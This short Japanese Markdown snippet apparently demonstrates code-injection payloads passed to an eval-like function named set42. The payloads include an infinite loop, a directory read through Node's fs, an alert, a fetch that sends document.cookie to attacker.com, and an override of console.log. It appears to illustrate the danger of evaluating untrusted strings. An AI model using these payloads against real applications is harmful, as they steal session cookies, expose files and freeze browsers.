# 無限ループ
```
set42("while(true){}");
// → 無限ループが実行されてブラウザがフリーズする
```

# ファイルシステムを読みこむ
```
set42("console.log(require('fs').readdirSync('.'))");
// → カレントディレクトリのファイル一覧が出力される
```

# アラートや通信
```
set42("alert('Hacked!')"); // Web環境でポップアップ
set42("fetch('https://attacker.com/steal?cookie=' + document.cookie)");
```

# 既存のオブジェクトや関数の上書き
```
set42("console.log = function(){}");
// → console.log が無効化される
```